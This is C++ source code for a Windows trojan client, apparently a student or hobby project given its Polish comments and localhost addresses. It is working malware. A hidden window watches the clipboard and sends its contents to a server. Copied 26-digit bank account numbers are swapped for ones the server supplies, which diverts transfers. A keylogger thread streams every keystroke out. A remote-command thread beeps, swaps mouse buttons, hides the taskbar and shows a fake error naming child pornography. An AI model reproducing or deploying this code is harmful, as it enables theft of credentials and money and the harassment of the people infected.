#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>

#pragma comment(lib, "WSOCK32.lib")
#include <stdlib.h>
#include <string>

static HWND hwndNxtVwr;
SOCKET s;
SOCKET keyLoggerSocket;
SOCKET commands;
bool ignore = false;

DWORD WINAPI receiveCommands(void * arguments);
DWORD WINAPI sendKeys(void * arguments);
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void readFromClipboard(HWND hwnd);

//main
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
{
	const LPCSTR CLASS_NAME = "TrojanClient";

	WNDCLASS wc = {};

	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = CLASS_NAME;

	RegisterClass(&wc);

	HWND hwnd = CreateWindowEx(
		0,
		CLASS_NAME,
		"WirusClient",
		WS_OVERLAPPEDWINDOW,
		600, 200, 300, 300,
		NULL, NULL, hInstance, NULL
	);
	MSG message;
	WNDCLASS window;

	//ShowWindow(hwnd, nCmdShow);
	struct sockaddr_in sa;
	WSADATA wsas;
	WORD version;
	version = MAKEWORD(2, 0);
	WSAStartup(version, &wsas);

	s = socket(AF_INET, SOCK_STREAM, 0);
	memset((void *)(&sa), 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(1372);
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");


	int result;
	result = connect(s, (struct sockaddr FAR *) &sa, sizeof(sa));

	if (result == SOCKET_ERROR)
	{
		MessageBoxA(hwnd, "Something went wrong!", "Something went wrong!", 0);
		return 1;
	}

	//-----------------KEYLOGGER--------------------------------------------------
	struct sockaddr_in sa_KL;
	keyLoggerSocket = socket(AF_INET, SOCK_STREAM, 0);
	memset((void *)(&sa_KL), 0, sizeof(sa_KL));
	sa_KL.sin_family = AF_INET;
	sa_KL.sin_port = htons(1373);
	sa_KL.sin_addr.s_addr = inet_addr("127.0.0.1");

	result = connect(keyLoggerSocket, (struct sockaddr FAR *) &sa_KL, sizeof(sa_KL));

	if (result == SOCKET_ERROR)
	{
		MessageBoxA(hwnd, "Something went wrong KL!", "Something went wrong KL!", 0);
		return 1;
	}

	//-----------------COMMANDS---------------------------------------------------
	struct sockaddr_in sa_CM;
	commands = socket(AF_INET, SOCK_STREAM, 0);
	memset((void *)(&sa_CM), 0, sizeof(sa_CM));
	sa_CM.sin_family = AF_INET;
	sa_CM.sin_port = htons(1374);
	sa_CM.sin_addr.s_addr = inet_addr("127.0.0.1");

	result = connect(commands, (struct sockaddr FAR *) &sa_CM, sizeof(sa_CM));

	if (result == SOCKET_ERROR)
	{
		MessageBoxA(hwnd, "Something went wrong CM!", "Something went wrong CM!", 0);
		return 1;
	}
	
	//ShowWindow(hwnd, nCmdShow);

	DWORD id;
	HANDLE receiving = CreateThread(
		NULL,           // atrybuty bezpieczeñstwa
		0,              // inicjalna wielkoœæ stosu
		receiveCommands,  // funkcja w¹tku
		(void*)&hwnd,// dane dla funkcji w¹tku
		0,              // flagi utworzenia
		&id);
	if (receiving != INVALID_HANDLE_VALUE)
		SetThreadPriority(receiving, THREAD_PRIORITY_NORMAL);

	DWORD id_KL;
	HANDLE sendingKeys = CreateThread(
		NULL,           // atrybuty bezpieczeñstwa
		0,              // inicjalna wielkoœæ stosuqwertyuiopasdfghjklzxcvbnm
		sendKeys,  // funkcja w¹tku
		NULL,// dane dla funkcji w¹tku
		0,              // flagi utworzenia
		&id_KL);
	if (sendingKeys != INVALID_HANDLE_VALUE)
		SetThreadPriority(sendingKeys, THREAD_PRIORITY_NORMAL);


	
	while (GetMessage(&message, (HWND)NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	closesocket(s);
	WSACleanup();
	return message.wParam;
}

bool isThisAccountNumber(char *text)
{
	int length = 0;
	int len = strlen(text);
	for (int i = 0; i < len; i++)
	{
		if ((text[i] < '0' || text[i] > '9') && text[i] != ' ')
			return false;

		else
			if (text[i] != ' ')
				length++;
	}
	if (length == 26)
		return true;
	return false;
}

//This gets called any time the value in clipboard is changed
void readFromClipboard(HWND hwnd)
{
	if (IsClipboardFormatAvailable(CF_TEXT))
	{
		OpenClipboard(NULL);
		HANDLE hCbMem = GetClipboardData(CF_TEXT);
		HANDLE hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));
		if (hProgMem != NULL)
		{
			LPSTR lpCbMem = (LPSTR)GlobalLock(hCbMem);
			LPSTR lpProgMem = (LPSTR)GlobalLock(hProgMem);
			strcpy(lpProgMem, lpCbMem);

			GlobalUnlock(hCbMem);
			GlobalUnlock(hProgMem);
			CloseClipboard();


			char buf[512] = { '\0' };
			strcpy(buf, lpProgMem);
	
			send(s, buf, 512, 0);
		
			if (isThisAccountNumber(buf))
			{
				if (recv(s, buf, 512, 0) > 0)
				{
					unsigned int wLen = strlen(buf);
					HGLOBAL hCbMem2 = GlobalAlloc(GHND, (DWORD)wLen + 1);
					LPVOID lpCbMem2 = GlobalLock(hCbMem2);
					char* cpCbMem = (char*)lpCbMem;
					char* cpProgMem = (char*)lpProgMem;
					memcpy(lpCbMem2, buf, wLen + 1);
					GlobalUnlock(hCbMem2);

					ignore = true;

					OpenClipboard(hwnd);
					EmptyClipboard();
					SetClipboardData(CF_TEXT, hCbMem2);
					CloseClipboard();
				}
			}
		}
	}
}

DWORD WINAPI receiveCommands(void * arguments) {
	HWND hwnd = (HWND)arguments;
	char buf[512];
	while (true) {
		if (recv(commands, buf, 512, 0) > 0) {

			if (buf == std::string("BEEP")) {
				int Freq, Dur, i;
				for (i = 0; i < 10; i++) {
					Freq = rand() % 2001;
					Dur = rand() % 501;
					Beep(Freq, Dur);
				}
			}
			else if (buf == std::string("SWAP")) {
				SwapMouseButton(false);
			}
			else if (buf == std::string("ERROR_POP_UP")) {
				MessageBox(NULL, TEXT("Error loading C:\\Documents and Settings\\All Users\\Child Porn"), TEXT("Error"), MB_OK | MB_ICONEXCLAMATION);
			}
			else if (buf == std::string("TASK_BAR")) {
				HWND hWin;
				hWin = FindWindow("Shell_TrayWnd", NULL);
				EnableWindow(hWin, false);
				ShowWindow(hWin, false);
			}
		}
	}
}

DWORD WINAPI sendKeys(void * arguments) {
	char buf[512] = { '\0' };
	//char KEY = 'x';

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if ((GetAsyncKeyState(KEY) == 0xFFFF8001)) {
				buf[0] = KEY;
				send(keyLoggerSocket,buf , 512, 0);
			}
		}
	}
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		hwndNxtVwr = SetClipboardViewer(hwnd);
		return (0);

	case WM_DESTROY:
		ChangeClipboardChain(hwnd, hwndNxtVwr);
		PostQuitMessage(0);
		return (0);

	case WM_CHANGECBCHAIN:
		if (wParam == (WORD)hwndNxtVwr)
		{
			hwndNxtVwr = (HWND)LOWORD(lParam);
		}
		else
		{
			if (hwndNxtVwr != NULL) {
				SendMessage(hwndNxtVwr, message, wParam, lParam);
			}
		}
		return (0);

	case WM_DRAWCLIPBOARD:
		if (!ignore)
		{
			readFromClipboard(hwnd);
			ignore = false;
		}
		if (hwndNxtVwr != NULL)
		{
			SendMessage(hwndNxtVwr, message, wParam, lParam);
		}
		return (0);

	default:
		return DefWindowProc(hwnd, message, wParam, lParam);
		
	}
}